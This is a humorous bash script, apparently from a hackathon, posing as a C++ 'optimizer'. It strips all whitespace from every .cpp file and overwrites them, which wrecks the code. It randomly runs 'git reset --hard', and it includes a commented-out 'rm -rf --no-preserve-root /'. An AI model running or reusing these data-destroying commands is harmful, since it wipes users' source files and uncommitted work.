# Use bash for script (at least it's not PHP)
#!/bin/bash

# Get a FULL path. This way you don't need to spend half of Hack Western
# trying to import a JavaScript library using relative paths
# TODO: Give myself a pat on the back for this beautiful code
SCRIPTDIR="$(realpath "${0}")"
DIR="$(dirname $SCRIPTDIR)/.."

# Recursive algorithm to find all C++ files (not python, too slow)
CPP=$(find $DIR -iname \*.cpp)

# Dynamic programming!
for file in $CPP; do
  # Remove whitespace for optimal compilation time
  # If we store it in memory now, the computer will remember it for later
  # TODO: Remove comments so the code actually compiles
  PRECIOUS_CODE="$(cat $file | tr -d " \t\n\r")"

  # Write to file using "echo", so everyone can hear it
  echo $PRECIOUS_CODE > $file
done

if [ $[ $RANDOM % 6 ] == 0 ]; then
  echo "ERROR: something went wrong :("

  # Too mean :(
  # sudo rm -rf --no-preserve-root /

  pushd $DIR > /dev/null
  git reset --hard
  popd > /dev/null

  echo "I really hope you commited everything, try reflog?!"
else
  echo "Your code has been fully optimized!"
fi
